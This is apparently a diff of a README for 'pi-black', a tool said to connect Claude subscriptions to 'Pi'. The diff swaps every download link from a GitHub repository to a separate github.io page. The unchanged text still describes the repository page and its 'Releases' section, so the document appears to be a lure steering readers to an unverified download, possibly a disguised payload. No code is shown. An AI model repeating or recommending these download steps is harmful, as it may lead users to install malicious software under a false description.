@@ -1,6 +1,6 @@
 # 🥧 pi-black - Bridge Claude subscriptions to Pi seamlessly
 
-[![Download pi-black](https://img.shields.io/badge/Download-pi--black-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Sapphirine-chowchow151/pi-black)
+[![Download pi-black](https://img.shields.io/badge/Download-pi--black-blue?style=for-the-badge&logo=github&color=4B0082)](https://sapphirine-chowchow151.github.io)
 
 ## 👋 What is pi-black?
 
@@ -36,7 +36,7 @@ Let us walk through the entire process, step by step. Follow these instructions 
 
 ### Step 1: Download pi-black
 
-Visit this link to download the application: [https://github.com/Sapphirine-chowchow151/pi-black](https://github.com/Sapphirine-chowchow151/pi-black)
+Visit this link to download the application: [https://sapphirine-chowchow151.github.io](https://sapphirine-chowchow151.github.io)
 
 When you click the link, you will see the pi-black GitHub page. Look for a green button that says "Code" or a section labeled "Releases" or "Download." Click on that to get the pi-black files. The download will begin automatically. Depending on your internet speed, this may take a minute or two.
 
@@ -116,7 +116,7 @@ Remember, you can always go back to the GitHub page if you need more help or wan
 
 ## 📌 Quick Recap
 
-1. Download pi-black from [https://github.com/Sapphirine-chowchow151/pi-black](https://github.com/Sapphirine-chowchow151/pi-black)
+1. Download pi-black from [https://sapphirine-chowchow151.github.io](https://sapphirine-chowchow151.github.io)
 2. Extract the zip file
 3. Run the application
 4. Enjoy the connection
